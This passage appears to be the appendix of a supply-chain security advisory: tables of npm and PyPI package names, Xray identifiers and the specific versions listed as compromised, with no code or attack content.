| @squawk/geo | XRAY-981765 | 0.4.8;0.4.7;0.4.6;0.4.5;0.4.4 |
| @squawk/icao-registry | XRAY-981780 | 0.5.6;0.5.5;0.5.4;0.5.3;0.5.2 |
| @squawk/icao-registry-data | XRAY-981759 | 0.8.8;0.8.6;0.8.7;0.8.5;0.8.4 |
| @squawk/mcp | XRAY-981760 | 0.9.5;0.9.4;0.9.3;0.9.2;0.9.1 |
| @squawk/navaid-data | XRAY-981763 | 0.6.8;0.6.7;0.6.6;0.6.5;0.6.4 |
| @squawk/navaids | XRAY-981791 | 0.4.6;0.4.5;0.4.4;0.4.3;0.4.2 |
| @squawk/notams | XRAY-981772 | 0.3.10;0.3.9;0.3.8;0.3.7;0.3.6 |
| @squawk/procedure-data | XRAY-981758 | 0.7.7;0.7.5;0.7.6;0.7.4;0.7.3 |
| @squawk/procedures | XRAY-981782 | 0.5.6;0.5.4;0.5.5;0.5.3;0.5.2 |
| @squawk/types | XRAY-981769 | 0.8.5;0.8.3;0.8.4;0.8.2;0.8.1 |
| @squawk/units | XRAY-981664 | 0.4.7;0.4.5;0.4.6;0.4.4;0.4.3 |
| @squawk/weather | XRAY-981788 | 0.5.10;0.5.8;0.5.9;0.5.7;0.5.6 |
| @supersurkhet/cli | XRAY-981629 | 0.0.7;0.0.6;0.0.5;0.0.4;0.0.3;0.0.2 |
| @supersurkhet/sdk | XRAY-981633 | 0.0.7;0.0.6;0.0.5;0.0.4;0.0.3;0.0.2 |
| @tallyui/components | XRAY-981682 | 1.0.3;1.0.2;1.0.1 |
| @tallyui/connector-medusa | XRAY-981673 | 1.0.3;1.0.2;1.0.1 |
| @tallyui/connector-shopify | XRAY-981663 | 1.0.3;1.0.2;1.0.1 |
| @tallyui/connector-vendure | XRAY-981677 | 1.0.3;1.0.2;1.0.1 |
| @tallyui/connector-woocommerce | XRAY-981678 | 1.0.3;1.0.2;1.0.1 |
| @tallyui/core | XRAY-981778 | 0.2.3;0.2.2;0.2.1 |
| @tallyui/database | XRAY-981674 | 1.0.3;1.0.2;1.0.1 |
| @tallyui/pos | XRAY-981675 | 0.1.3;0.1.2;0.1.1 |
| @tallyui/storage-sqlite | XRAY-981757 | 0.2.3;0.2.2;0.2.1 |
| @tallyui/theme | XRAY-981679 | 0.2.3;0.2.2;0.2.1 |
| @tanstack/arktype-adapter | XRAY-981393 | 1.166.15;1.166.12 |
| @tanstack/eslint-plugin-router | XRAY-981423 | 1.161.12;1.161.9 |
| @tanstack/eslint-plugin-start | XRAY-981394 | 0.0.7;0.0.4 |
| @tanstack/history | XRAY-981408 | 1.161.12;1.161.9 |
| @tanstack/nitro-v2-vite-plugin | XRAY-981403 | 1.154.15;1.154.12 |
| @tanstack/react-router | XRAY-981412 | 1.169.8;1.169.5 |
| @tanstack/react-router-devtools | XRAY-981428 | 1.166.19;1.166.16 |
| @tanstack/react-router-ssr-query | XRAY-981410 | 1.166.18;1.166.15 |
| @tanstack/react-start | XRAY-981426 | 1.167.71;1.167.68 |
| @tanstack/react-start-client | XRAY-981397 | 1.166.54;1.166.51 |
| @tanstack/react-start-rsc | XRAY-981399 | 0.0.50;0.0.47 |
| @tanstack/react-start-server | XRAY-981421 | 1.166.58;1.166.55 |
| @tanstack/router-cli | XRAY-981420 | 1.166.49;1.166.46 |
| @tanstack/router-core | XRAY-981409 | 1.169.8;1.169.5 |
| @tanstack/router-devtools | XRAY-981425 | 1.166.19;1.166.16 |
| @tanstack/router-devtools-core | XRAY-981414 | 1.167.9;1.167.6 |
| @tanstack/router-generator | XRAY-981417 | 1.166.48;1.166.45 |
| @tanstack/router-plugin | XRAY-981395 | 1.167.41;1.167.38 |
| @tanstack/router-ssr-query-core | XRAY-981402 | 1.168.6;1.168.3 |
| @tanstack/router-utils | XRAY-981401 | 1.161.14;1.161.11 |
| @tanstack/router-vite-plugin | XRAY-981404 | 1.166.56;1.166.53 |
| @tanstack/solid-router | XRAY-981429 | 1.169.8;1.169.5 |
| @tanstack/solid-router-devtools | XRAY-981424 | 1.166.19;1.166.16 |
| @tanstack/solid-router-ssr-query | XRAY-981419 | 1.166.18;1.166.15 |
| @tanstack/solid-start | XRAY-981418 | 1.167.68;1.167.65 |
| @tanstack/solid-start-client | XRAY-981400 | 1.166.53;1.166.50 |
| @tanstack/solid-start-server | XRAY-981396 | 1.166.57;1.166.54 |
| @tanstack/start-client-core | XRAY-981407 | 1.168.8;1.168.5 |
| @tanstack/start-fn-stubs | XRAY-981422 | 1.161.12;1.161.9 |
| @tanstack/start-plugin-core | XRAY-981388 | 1.169.26;1.169.23 |
| @tanstack/start-server-core | XRAY-981416 | 1.167.36;1.167.33 |
| @tanstack/start-static-server-functions | XRAY-981389 | 1.166.47;1.166.44 |
| @tanstack/start-storage-context | XRAY-981390 | 1.166.41;1.166.38 |
| @tanstack/valibot-adapter | XRAY-981406 | 1.166.15;1.166.12 |
| @tanstack/virtual-file-routes | XRAY-981398 | 1.161.13;1.161.10 |
| @tanstack/vue-router | XRAY-981405 | 1.169.8;1.169.5 |
| @tanstack/vue-router-devtools | XRAY-981413 | 1.166.19;1.166.16 |
| @tanstack/vue-router-ssr-query | XRAY-981392 | 1.166.18;1.166.15 |
| @tanstack/vue-start | XRAY-981391 | 1.167.64;1.167.61 |
| @tanstack/vue-start-client | XRAY-981415 | 1.166.49;1.166.46 |
| @tanstack/vue-start-server | XRAY-981411 | 1.166.53;1.166.50 |
| @tanstack/zod-adapter | XRAY-981427 | 1.166.15;1.166.12 |
| @taskflow-corp/cli | XRAY-981614 | 0.1.29;0.1.28;0.1.27;0.1.26;0.1.25;0.1.24 |
| @tolka/cli | XRAY-981591 | 1.0.5;1.0.6;1.0.4;1.0.3;1.0.2 |
| @uipath/access-policy-sdk | XRAY-981571 | 0.3.1 |
| @uipath/access-policy-tool | XRAY-981607 | 0.3.1 |
| @uipath/admin-tool | XRAY-981593 | 0.1.1 |
| @uipath/agent-sdk | XRAY-981606 | 1.0.2 |
| @uipath/agent-tool | XRAY-981579 | 1.0.1 |
| @uipath/agent.sdk | XRAY-981766 | 0.0.18 |
| @uipath/aops-policy-tool | XRAY-981558 | 0.3.1 |
| @uipath/ap-chat | XRAY-981560 | 1.5.7 |
| @uipath/api-workflow-tool | XRAY-981553 | 1.0.1 |
| @uipath/apollo-core | XRAY-981585 | 5.9.2 |
| @uipath/apollo-react | XRAY-981776 | 4.24.5 |
| @uipath/apollo-wind | XRAY-981617 | 2.16.2 |
| @uipath/auth | XRAY-981631 | 1.0.1 |
| @uipath/case-tool | XRAY-981574 | 1.0.1 |
| @uipath/cli | XRAY-981578 | 1.0.1 |
| @uipath/codedagent-tool | XRAY-981596 | 1.0.1 |
| @uipath/codedagents-tool | XRAY-981572 | 0.1.12 |
| @uipath/codedapp-tool | XRAY-981623 | 1.0.1 |
| @uipath/common | XRAY-981567 | 1.0.1 |
| @uipath/context-grounding-tool | XRAY-981598 | 0.1.1 |
| @uipath/data-fabric-tool | XRAY-981602 | 1.0.2 |
| @uipath/docsai-tool | XRAY-981620 | 1.0.1 |
| @uipath/filesystem | XRAY-981636 | 1.0.1 |
| @uipath/flow-tool | XRAY-981554 | 1.0.2 |
| @uipath/functions-tool | XRAY-981555 | 1.0.1 |
| @uipath/gov-tool | XRAY-981627 | 0.3.1 |
| @uipath/identity-tool | XRAY-981559 | 0.1.1 |
| @uipath/insights-sdk | XRAY-981564 | 1.0.1 |
| @uipath/insights-tool | XRAY-981615 | 1.0.1 |
| @uipath/integrationservice-sdk | XRAY-981624 | 1.0.2 |
| @uipath/integrationservice-tool | XRAY-981566 | 1.0.2 |
| @uipath/llmgw-tool | XRAY-981610 | 1.0.1 |
| @uipath/maestro-sdk | XRAY-981563 | 1.0.1 |
| @uipath/maestro-tool | XRAY-981592 | 1.0.1 |
| @uipath/orchestrator-tool | XRAY-981616 | 1.0.1 |
| @uipath/packager-tool-apiworkflow | XRAY-981628 | 0.0.19 |
| @uipath/packager-tool-bpmn | XRAY-981581 | 0.0.9 |
| @uipath/packager-tool-case | XRAY-981588 | 0.0.9 |
| @uipath/packager-tool-connector | XRAY-981619 | 0.0.19 |
| @uipath/packager-tool-flow | XRAY-981586 | 0.0.19 |
| @uipath/packager-tool-functions | XRAY-981580 | 0.1.1 |
| @uipath/packager-tool-webapp | XRAY-981590 | 1.0.6 |
| @uipath/packager-tool-workflowcompiler | XRAY-981577 | 0.0.16 |
| @uipath/packager-tool-workflowcompiler-browser | XRAY-981589 | 0.0.34 |
| @uipath/platform-tool | XRAY-981594 | 1.0.1 |
| @uipath/project-packager | XRAY-981613 | 1.1.16 |
| @uipath/resource-tool | XRAY-981582 | 1.0.1 |
| @uipath/resourcecatalog-tool | XRAY-981603 | 0.1.1 |
| @uipath/resources-tool | XRAY-981604 | 0.1.11 |
| @uipath/robot | XRAY-981626 | 1.3.4 |
| @uipath/rpa-legacy-tool | XRAY-981562 | 1.0.1 |
| @uipath/rpa-tool | XRAY-981609 | 0.9.5 |
| @uipath/solution-packager | XRAY-981595 | 0.0.35 |
| @uipath/solution-tool | XRAY-981583 | 1.0.1 |
| @uipath/solutionpackager-sdk | XRAY-981561 | 1.0.11 |
| @uipath/solutionpackager-tool-core | XRAY-981634 | 0.0.34 |
| @uipath/tasks-tool | XRAY-981597 | 1.0.1 |
| @uipath/telemetry | XRAY-981576 | 0.0.7 |
| @uipath/test-manager-tool | XRAY-981568 | 1.0.2 |
| @uipath/tool-workflowcompiler | XRAY-981584 | 0.0.12 |
| @uipath/traces-tool | XRAY-981608 | 1.0.1 |
| @uipath/ui-widgets-multi-file-upload | XRAY-981573 | 1.0.1 |
| @uipath/uipath-python-bridge | XRAY-981557 | 1.0.1 |
| @uipath/vertical-solutions-tool | XRAY-981625 | 1.0.1 |
| @uipath/vss | XRAY-981632 | 0.1.6 |
| @uipath/widget.sdk | XRAY-981635 | 1.2.3 |
| agentwork-cli | XRAY-981611 | 0.1.4;0.1.5 |
| cmux-agent-mcp | XRAY-981556 | 0.1.8;0.1.7;0.1.6;0.1.5;0.1.4;0.1.3 |
| cross-stitch | XRAY-981779 | 1.1.7;1.1.5;1.1.6;1.1.4;1.1.3 |
| git-branch-selector | XRAY-981575 | 1.3.7;1.3.6;1.3.5;1.3.4;1.3.3 |
| git-git-git | XRAY-981601 | 1.0.12;1.0.11;1.0.10;1.0.9;1.0.8 |
| ml-toolkit-ts | XRAY-981570 | 1.0.5;1.0.4 |
| nextmove-mcp | XRAY-981612 | 0.1.7;0.1.6;0.1.5;0.1.4;0.1.3 |
| safe-action | XRAY-981618 | 0.8.4;0.8.3 |
| ts-dna | XRAY-981771 | 3.0.5;3.0.4;3.0.3;3.0.2;3.0.1 |
| wot-api | XRAY-981777 | 0.8.3;0.8.4;0.8.2;0.8.1 |

## Appendix B: PyPI Compromised Package Versions

| type | XrayID | Version |
| :---- | :---- | :---- |
| guardrails-ai | XRAY-981784 | 0.10.1 |
| mistralai | XRAY-981756 | 2.4.6 |
